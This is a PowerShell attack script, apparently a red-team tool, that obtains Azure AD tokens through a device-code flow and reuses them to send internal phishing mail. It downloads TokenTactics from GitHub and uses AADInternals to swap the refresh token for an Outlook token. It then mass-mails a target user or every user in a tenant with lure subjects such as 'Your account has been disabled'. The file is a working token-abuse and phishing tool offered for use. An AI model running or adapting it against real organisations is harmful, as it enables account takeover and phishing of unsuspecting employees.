[CmdletBinding()]
param (
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$targetUser,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$messageContent,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$subject,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$Token
)

# Check if AADInternals module is available
if (-not (Get-Module -Name AADInternals -ListAvailable)) {
    # Install the AADInternals module if it's not available
    Install-Module AADInternals -Force
    Write-Output "AADInternals module has been installed."
}

# Import the AADInternals module
Import-Module AADInternals -Force
Write-Output "AADInternals module has been imported."

# Check if TokenTactics module is available
if (!(Get-Module -ListAvailable -Name TokenTactics)) {
    # Download the latest TokenTactics zip if the module is not available
    Write-Output "TokenTactics not found, downloading latest version into current working directory."
    Invoke-WebRequest -Uri https://github.com/mellonaut/TokenTactics/archive/refs/heads/main.zip -OutFile tokentactics.zip

    if (Test-Path -Path .\tokentactics) {
        Remove-Item -Path .\tokentactics -Recurse -Force
    }

    Expand-Archive -LiteralPath .\tokentactics.zip -DestinationPath .\tokentactics -Force
    Get-ChildItem -Path .\tokentactics\tokentactics-main\* -Recurse | Move-Item -Destination .\tokentactics -Force
    Remove-Item -Path .\tokentactics\tokentactics-main -Recurse -Force
}

# Import or re-import the TokenTactics module
Import-Module .\tokentactics\TokenTactics.psd1 -Force
Write-Output "TokenTactics module has been imported."


# Check if $Token has been specified and is not null or empty
if ([string]::IsNullOrWhiteSpace($Token)) {
    # If $Token is not specified, just call Get-AzureToken for Graph
    Write-Output "`$Token is not specified. Generating new device code."
    Invoke-ClearToken -Token All
    Write-Output "Clearing any previous tokens for a clean run."
    Get-AzureToken -Client Graph    
} else {
    # If $Token is specified, use it with the CaptureCode parameter
    Write-Output "Using specified access token $Token."
    Get-AzureToken -Client Graph -CaptureCode $Token
}



if(!($response)){ Read-Host "Need to authenticate!"} else {
$access = $response.access_token
$refresh = $response.refresh_token
Add-AADIntAccessTokenToCache -AccessToken $access -RefreshToken $refresh

$acc = Read-AADIntAccessToken $access
$user = $acc.upn
$domain = $user.Split("@")[1]
Write-Output "Sending as $user "

### Phishing Message Content

$At=Invoke-RefreshToOutlookToken -domain $domain -refreshtoken $response.refresh_token
Add-AADIntAccessTokenToCache -AccessToken $At.access_token -RefreshToken $At.refresh_token

$teamsMessage = $messageContent

### Conditional logic for Sending Messages
if ($targetUser) {
    if ($targetUser -eq "all") {

        $users = Get-Content ".\users.json"
        foreach ($user in $users) {
            Read-Host "Warning: This will will attempt to send your phishing message to every user in the tenant. Do you want to continue?"
            Write-Output "You like to party."
            Write-Output "Going wide."            
            Write-Output "Sending Outlook messages..."
            # Send-TeamsMessageWithRetry -Recipient $user.UserPrincipalName -Message $teamsMessage
            if(!($subject)){$subject = "Third-Party Consent for use of your company's intellectual property"}
            if(!($messageContent)) { $messageContent = "We have been trying to reach you regarding use of your company's work in our upcoming calendar, please review these forms if you have any concerns or wish to object usage of your logo, etc, etc"}
        Send-AADIntOutlookMessage -AccessToken $At.access_token -Recipient $user -Subject "Your account has been disabled" -Message $teamsMessage
        }
    } else {
        Write-Output "Sending Phishing email.."        
        # Send-TeamsMessageWithRetry -Recipient $targetUser -Message $teamsMessage
        $mailuser = $targetUser
        if(!($subject)){$subject = "Third-Party Consent for use of your company's intellectual property"}
        if(!($messageContent)) { $messageContent = "We have been trying to reach you regarding use of your company's work in our upcoming calendar, please review these forms if you have any concerns or wish to object usage of your logo, etc, etc"}
        Send-AADIntOutlookMessage -AccessToken $At.access_token -Recipient $mailUser -Subject $subject -Message $teamsMessage
    }
} else {
    Write-Host "No Target user specified. No emails sent."
}
}
